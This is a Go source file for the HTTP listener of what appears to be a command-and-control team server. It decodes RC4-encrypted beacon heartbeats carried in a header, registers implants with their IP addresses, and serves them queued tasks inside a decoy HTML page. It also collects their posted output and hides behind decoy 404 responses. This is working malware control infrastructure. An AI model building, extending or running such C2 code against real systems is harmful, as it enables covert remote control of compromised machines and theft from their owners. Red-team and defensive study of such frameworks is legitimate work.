package listener

import (
	"OneServer/middlewares"
	"bytes"
	"crypto/rand"
	"crypto/rc4"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/pem"
	"errors"
	"fmt"
	"github.com/gin-gonic/gin"
	"io"
	"log"
	"math/big"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

func (handler *HTTP) Start(ts TeamServer) error {
	var err error = nil

	gin.SetMode(gin.DebugMode)
	router := gin.New()
	router.NoRoute(handler.pageError)

	router.Use(middlewares.ResponseHeaderMiddleware(handler.Config.ResponseHeaders))

	// TODO
	router.GET(handler.Config.URI, handler.processRequest)
	router.POST(handler.Config.URI, handler.processResponse)

	handler.Active = true

	handler.Server = &http.Server{
		Addr:    fmt.Sprintf("%s:%d", handler.Config.HostBind, handler.Config.PortBind),
		Handler: router,
	}

	if handler.Config.SSL {
		fmt.Printf("   Started listener: https://%s:%d\n", handler.Config.HostBind, handler.Config.PortBind)

		listenerPath := "/static"
		_, err = os.Stat(listenerPath)
		if os.IsNotExist(err) {
			err = os.Mkdir(listenerPath, os.ModePerm)
			if err != nil {
				return fmt.Errorf("failed to create %s folder: %s", listenerPath, err.Error())
			}
		}

		handler.Config.SSLCertPath = listenerPath + "/listener.crt"
		handler.Config.SSLKeyPath = listenerPath + "/listener.key"

		if len(handler.Config.SSLCert) == 0 || len(handler.Config.SSLKey) == 0 {
			err = handler.generateSelfSignedCert(handler.Config.SSLCertPath, handler.Config.SSLKeyPath)
			if err != nil {
				handler.Active = false
				fmt.Println("Error generating self-signed certificate:", err)
				return err
			}
		} else {
			err = os.WriteFile(handler.Config.SSLCertPath, handler.Config.SSLCert, 0600)
			if err != nil {
				return err
			}
			err = os.WriteFile(handler.Config.SSLKeyPath, handler.Config.SSLKey, 0600)
			if err != nil {
				return err
			}
		}

		go func() {
			err = handler.Server.ListenAndServeTLS(handler.Config.SSLCertPath, handler.Config.SSLKeyPath)
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting HTTPS server: %v\n", err)
				return
			}
			handler.Active = true
		}()

	} else {
		fmt.Printf("   Started listener: http://%s:%d\n", handler.Config.HostBind, handler.Config.PortBind)

		go func() {
			err = handler.Server.ListenAndServe()
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting HTTP server: %v\n", err)
				return
			}
			handler.Active = true
		}()
	}

	time.Sleep(500 * time.Millisecond)
	return err
}

func (handler *HTTP) parseBeat(ctx *gin.Context) (string, []byte, error) {

	// 1. 解析 Cookie 里的 SESSIONID
	cookie := ctx.Request.Header.Get(handler.Config.HBHeader)
	if !strings.HasPrefix(cookie, handler.Config.HBPrefix) {
		return "", nil, errors.New("no SESSIONID in cookie")
	}
	beatB64 := strings.TrimPrefix(cookie, handler.Config.HBPrefix)

	// 2. base64url 解码
	beaconInfoCrypt, err := base64.RawURLEncoding.DecodeString(beatB64)
	if err != nil || len(beaconInfoCrypt) < 8 {
		return "", nil, errors.New("failed to decode beat")
	}

	// 3. RC4 解密
	rc4crypt, err := rc4.NewCipher([]byte(handler.Config.EncryptKey))
	if err != nil {
		return "", nil, errors.New("rc4 decrypt error")
	}
	beaconInfo := make([]byte, len(beaconInfoCrypt))
	rc4crypt.XORKeyStream(beaconInfo, beaconInfoCrypt)

	// 4. 解析 beaconType 和 beaconId
	if len(beaconInfo) < 8 {
		return "", nil, errors.New("beat too short")
	}
	beaconId := binary.BigEndian.Uint32(beaconInfo[:4])
	restbeaconInfo := beaconInfo[4:]

	return fmt.Sprintf("%08x", beaconId), restbeaconInfo, nil
}

func (handler *HTTP) validate(ctx *gin.Context) error {
	// 1. 校验 URI
	u, err := url.Parse(ctx.Request.RequestURI)
	if err != nil || handler.Config.URI != u.Path {
		handler.pageError(ctx)
		return err
	}

	// 2. 校验 HostHeader
	if handler.Config.HostHeader != "" && handler.Config.HostHeader != ctx.Request.Host {
		handler.pageError(ctx)
		return err
	}

	// 3. 校验 UserAgent
	if handler.Config.UserAgent != ctx.Request.UserAgent() {
		handler.pageError(ctx)
		return err
	}

	return nil
}

func (handler *HTTP) processRequest(ctx *gin.Context) {

	// 校验请求合法性
	err := handler.validate(ctx)
	if err != nil {
		return
	}

	// 获取外部 IP
	externalIP := strings.Split(ctx.Request.RemoteAddr, ":")[0]
	if handler.Config.XForwardedFor {
		xff := ctx.Request.Header.Get("X-Forwarded-For")
		if xff != "" {
			externalIP = xff
		}
	}

	beaconId, beat, err := handler.parseBeat(ctx)
	if err != nil {
		handler.pageError(ctx)
		return
	}

	if !listenerHTTP.ts.BeaconIsExists(beaconId) {
		if err := listenerHTTP.ts.BeaconCreate(beaconId, beat, handler.Name, externalIP, true); err != nil {
			handler.pageError(ctx)
			return
		}
	}

	responseData, err := listenerHTTP.ts.BeaconGetAllTasks(beaconId, 0x1900000) // 25 Mb
	if err != nil {
		handler.pageError(ctx)
		return
	}

	html := []byte(strings.ReplaceAll(handler.Config.PagePayload, "<<<PAYLOAD_DATA>>>", string(responseData)))
	if _, err := ctx.Writer.Write(html); err != nil {
		handler.pageError(ctx)
		return
	}

	ctx.AbortWithStatus(http.StatusOK)
	return
}

func (handler *HTTP) processResponse(ctx *gin.Context) {

	// 校验请求合法性
	err := handler.validate(ctx)
	if err != nil {
		return
	}

	// 获取外部 IP
	externalIP := strings.Split(ctx.Request.RemoteAddr, ":")[0]
	if handler.Config.XForwardedFor {
		xff := ctx.Request.Header.Get("X-Forwarded-For")
		if xff != "" {
			externalIP = xff
		}
	}

	beaconId, beat, err := handler.parseBeat(ctx)
	if err != nil {
		handler.pageError(ctx)
		return
	}

	if !listenerHTTP.ts.BeaconIsExists(beaconId) {
		if err := listenerHTTP.ts.BeaconCreate(beaconId, beat, handler.Name, externalIP, true); err != nil {
			handler.pageError(ctx)
			return
		}
	}

	// 处理 agent 数据
	// 读取原始 body
	bodyBytes, _ := io.ReadAll(ctx.Request.Body)
	defer ctx.Request.Body.Close()

	// 直接打印（十六进制 + 字符串）
	log.Printf("[HTTP] ← Raw POST body (%d bytes):\n%s", len(bodyBytes), hex.Dump(bodyBytes))
	log.Printf("[HTTP] ← String view:\n%s", string(bodyBytes))

	err = listenerHTTP.ts.BeaconProcessData(beaconId, bodyBytes)
	if err != nil {
		handler.pageError(ctx)
	}

	ctx.AbortWithStatus(http.StatusOK)
}

func (handler *HTTP) generateSelfSignedCert(certFile, keyFile string) error {
	var (
		certData   []byte
		keyData    []byte
		certBuffer bytes.Buffer
		keyBuffer  bytes.Buffer
		privateKey *rsa.PrivateKey
		err        error
	)

	privateKey, err = rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return fmt.Errorf("failed to generate private key: %v", err)
	}

	serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
	serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
	if err != nil {
		return fmt.Errorf("failed to generate serial number: %v", err)
	}

	template := x509.Certificate{
		SerialNumber: serialNumber,
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),

		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	template.DNSNames = []string{handler.Config.HostBind}

	certData, err = x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return fmt.Errorf("failed to create certificate: %v", err)
	}

	err = pem.Encode(&certBuffer, &pem.Block{Type: "CERTIFICATE", Bytes: certData})
	if err != nil {
		return fmt.Errorf("failed to write certificate: %v", err)
	}

	handler.Config.SSLCert = certBuffer.Bytes()
	err = os.WriteFile(certFile, handler.Config.SSLCert, 0644)
	if err != nil {
		return fmt.Errorf("failed to create certificate file: %v", err)
	}

	keyData = x509.MarshalPKCS1PrivateKey(privateKey)
	err = pem.Encode(&keyBuffer, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: keyData})
	if err != nil {
		return fmt.Errorf("failed to write private key: %v", err)
	}

	handler.Config.SSLKey = keyBuffer.Bytes()
	err = os.WriteFile(keyFile, handler.Config.SSLKey, 0644)
	if err != nil {
		return fmt.Errorf("failed to create key file: %v", err)
	}

	return nil
}

func (handler *HTTP) pageError(ctx *gin.Context) {
	ctx.Writer.WriteHeader(http.StatusNotFound)
	html := []byte(handler.Config.PageError)
	_, _ = ctx.Writer.Write(html)
}
